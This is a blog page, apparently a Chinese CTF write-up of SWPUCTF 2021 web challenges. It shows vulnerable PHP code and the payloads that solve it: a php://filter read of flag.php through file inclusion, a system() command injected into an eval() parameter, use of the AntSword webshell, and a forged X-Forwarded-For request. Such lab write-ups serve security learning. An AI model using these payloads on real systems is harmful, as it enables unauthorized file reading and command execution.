+<p><img src="/images/SWPUCTF-Web-sql-4.png" alt="成功拿到flag"></p>
+<h2 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h2><p><img src="/images/SWPUCTF-Web-include-1.png" alt="题目详情"></p>
+<p>用<code>Hackbar</code>传入一个<code>file</code>试试</p>
+<p><img src="/images/SWPUCTF-Web-include-2.png" alt="图二展示了利用Hackbar传入一个名为file值为1的参数后页面回显"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag 在flag.php中&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;传入一个file试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span> flag 在flag.php中</span><br></pre></td></tr></table></figure>
+
+<p>分析脚本发现其中开了远程包含，说明我们可以用文件包含(远程包含)去做这道题，我们通过PHP伪协议来远程包含并读取<code>flag.php</code>文件</p>
+<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取</p>
+<p>For example:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>通俗来讲，convert.base64-encode是一种过滤器，read是用来指定读取的文章内容利用管道符，来进行条件的再筛选，后面要进行base64-encode以解码</p>
+<p>构造以下payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SWPUCTF-Web-include-3.png" alt="图三展示了利用php伪协议以读取flag.php文件"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span>=<span class="string">&#x27;NSSCTF&#123;e8c19d3d-d948-4e0b-8d6d-1fbf35fd3ba2&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">eval($_GET[&#x27;url&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SWPUCTF-Web-easyrce-1.png"></p>
+<p>替换成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SWPUCTF-Web-easyrce-2.png"></p>
+<h2 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h2><p>直接AntSword连接后在根目录下找到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;68bb6079-56dc-4f7a-ba1e-96afcdca7b1a&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h2><p>抓包后将<code>User-Agent</code>改成<code>WLLM</code></p>
+<p><img src="/images/SWPUCTF-http-1.png"></p>
+<p><img src="/images/SWPUCTF-http-2.png"></p>
+<p>发现这里是有一个文件的，还给了提示”智能用本地ip访问”</p>
+<p>直接用XFF(X-Forwarded-For)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /./a.php HTTP/1.1</span><br><span class="line">Host: node7.anna.nssctf.cn:28524</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: WLLM</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/SWPUCTF-http-3.png"></p>
+<p>在MITM交互式劫持页面选择放行（我们上面构造的数据包）</p>
+<p><img src="/images/SWPUCTF-http-4.png"></p>
+<p>成功拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;ee2756e8-a41c-4d15-8bd9-0f50a445919d&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-babyFibo/" rel="prev" title="攻防世界Crypto-babyFibo">
+                  <i class="fa fa-angle-left"></i> 攻防世界Crypto-babyFibo
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/07/27/what-is-greedy-algorithm/" rel="next" title="What Is Greedy Algorithm">
+                  What Is Greedy Algorithm <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">fishcanf1y</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
